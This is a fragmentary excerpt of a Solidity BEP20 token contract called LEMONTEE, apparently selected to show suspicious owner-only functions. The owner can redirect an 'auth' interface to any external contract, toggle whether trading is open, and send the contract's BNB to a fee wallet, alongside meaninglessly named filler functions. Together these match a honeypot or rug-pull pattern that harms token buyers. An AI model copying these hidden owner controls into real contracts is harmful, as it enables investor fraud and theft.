...
abstract contract Auth {
     ...
     */
    function caller(address _auth) public onlyOwner {
        auth = iBEP20(_auth);
    }
    /**
...
contract LEMONTEE is IBEP20, Auth {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "LEMONTEE";
    string constant _symbol = "LEMONTEE";
    ...
    function clearfee(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function tradingbonus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }    
    ...
    function creaseprocess(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
      require(gas >= 750000);
    ...
    function Reget(uint256 gas) external pure returns(uint256) {
      require(gas >= 75);        
      return gas * 1 gwei;
  }
